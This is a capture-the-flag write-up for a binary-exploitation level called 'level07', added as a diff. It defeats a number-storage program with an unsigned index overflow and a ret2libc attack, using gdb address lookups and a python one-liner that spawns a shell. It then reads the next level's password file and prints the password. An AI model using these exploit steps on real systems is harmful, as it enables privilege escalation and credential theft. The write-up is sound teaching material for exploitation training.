@@ -1,0 +1,211 @@
+# level07
+
+## Testing the binary
+
+```sh
+$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+Input command: store
+ Number: 1
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 1
+ Index: 23
+ Completed store command successfully
+Input command: store
+ Number: 1
+ Index: 101
+ Completed  command successfully
+Input command: store
+ Number: 1
+ Index: 200
+ Completed store command successfully
+Input command: store
+ Number: 1
+ Index: 213
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+```
+
+There's no buffer overflow, however we can read/write 4 bytes of memory anywhere we want, except in this case :
+
+```c
+if (!(index % 3) || number >> 21 != 183)
+```
+
+This condition is a bit tricky, but it's not that hard to understand.
+
+One of these must be true :
+
+1. The passed index must be a multiple of 3
+2. Once shifted 21 bits to the right, the number must not be equal to 183 (so it must be different from 183, 366, 549, etc.)
+
+If one of these conditions is true, the program won't write the number to the array.
+
+When the program runs, both `argv` and `envp` are cleared, so we can't use them to pass shellcode to the program.
+
+We can perform a `ret2libc` attack, but we need to know the address of `system` and the address of `/bin/sh` along the address of the `buffer` that's reserved to store the numbers.
+
+```sh
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:      "/bin/sh"
+```
+
+And to get the address of the buffer, nothing really complicated.
+
+Since the only parameter to the `read_number` function is the address of the buffer, we can just put a breakpoint at the beginning of the function and get the address of the buffer from the stack.
+
+```sh
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) r
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+
+(gdb) info registers
+eax            0xffffd554       -10924
+ecx            0xffffd600       -10752
+edx            0xffffd600       -10752
+ebx            0xffffd554       -10924
+esp            0xffffd500       0xffffd500
+ebp            0xffffd528       0xffffd528
+esi            0xffffd6ec       -10516
+edi            0x8048d65        134516069
+eip            0x80486dd        0x80486dd <read_number+6>
+eflags         0x286    [ PF SF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+```
+
+The address of the buffer is `0xffffd500`, we can confirm this by printing its content using `x/100d 0xffffd500`
+
+```sh
+(gdb) x/100d 0xffffd500
+0xffffd500:     0       -10924  0       -136137024
+0xffffd510:     -10472  -134280624      0       -10924
+0xffffd520:     0       -8228   -10472  134514992
+0xffffd530:     -10924  20      -134415680      -134363372
+0xffffd540:     152     -1      -10228  -10312
+0xffffd550:     0       0       0       0
+```
+
+Then write a recognizable pattern to the buffer and continue the execution of the program.
+
+```sh
+
+Input command: store
+ Number: 414141
+ Index: 1
+ Completed store command successfully
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) x/100d 0xffffd500
+0xffffd500:     -10515  134516064       -10472  -136137024
+0xffffd510:     -134415840      134516043       -10956  -10924
+0xffffd520:     -10515  134516064       -10472  134514992
+0xffffd530:     -10924  20      -134415680      -134363372
+0xffffd540:     152     -1      -10228  -10312
+0xffffd550:     0       0       414141  0
+```
+
+And we can see that the pattern `414141` is written to the buffer, offsetted by `22 * 4 = 88` bytes. So the `data[0]` is at `$esp + (21*4)` (we wrote our number at index 1)
+
+```sh
+(gdb) x/d $esp + (22*4)
+0xffffd558:     414141
+```
+And indeed, it works.
+
+We also need the index of `eip` from our data array.
+
+```sh
+(gdb) info frame
+Stack level 0, frame at 0xffffd720:
+ eip = 0x8048928 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args: 
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
+```
+
+The address of `eip` is `0xffffd71c`, so the index of `eip` is `((0xffffd71c - 0xffffd554) / 4) = 114`
+
+However, `114` is a protected index. Since the program expects us to write an `unsigned integer`, we can overflow the index by writing a negative number.
+
+(4294967295 / 4) + 114 = 1073741938.
+
+```sh
+Input command: store 
+ Number: 2147483647
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x7fffffff in ?? ()
+```
+
+`0x7fffffff` is 2147483647, so we can confirm that we can overwrite the `eip` register.
+
+## Exploitation
+
+1. Write the address of `system` (`0xf7e6aed0`) at position `114` (overflown to `1073741938`)
+2. Write the address of `/bin/sh` (`0xf7f897ec`) at position `116`
+3. Quit the program
+
+```sh
+$ python -c 'print "store\n" + str(0xf7e6aed0) + "\n" + "1073741938\n" + "store\n" + str(0xf7f897ec) + "\n" + "116\n" + "quit\n"' > /tmp/exp.07
+$ cat /tmp/exp.07 - | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+id
+uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
